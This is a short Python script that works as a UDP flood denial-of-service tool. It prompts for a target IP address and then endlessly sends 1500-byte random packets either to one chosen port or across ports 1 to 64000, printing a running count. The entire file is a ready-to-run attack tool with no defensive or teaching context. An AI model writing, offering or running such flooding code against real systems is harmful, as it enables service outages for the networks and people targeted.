#!/usr/bin/python3
import socket
import random


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
number_bytes = random._urandom(1500) 


def attack_specific_port(port_):
    try:
        port_ = int(port_)
    except ValueError:
        print("Not usable port")
        return
    count = 0
    while True:
        s.sendto(number_bytes, (ip, port_))
        count += 1
        print(f"{count} of packet has been SENT to : {ip}:{port_} ")


def attack_all_ports():
    port_number = 1
    count = 0
    while True:
        s.sendto(number_bytes, (ip, port_number))
        count += 1
        port_number += 1
        print(f"{count} of packet has been SENT to : {ip}:{port_number} ")
        if port_number >= 64000:
            port_number = 1


while True:
    ip = input("\nEnter target ip : ")
    try:
        if ip:
            ans = input(f"\nTarget : {ip} ..  Procced (Y,N) ?")
            if ans.lower() == "n":
                pass
            else:
                port = input("\nTo target specific port .. enter it , else press enter : ")
                if port:
                    attack_specific_port(port_=port)
                else:
                    attack_all_ports()
    except:
        pass
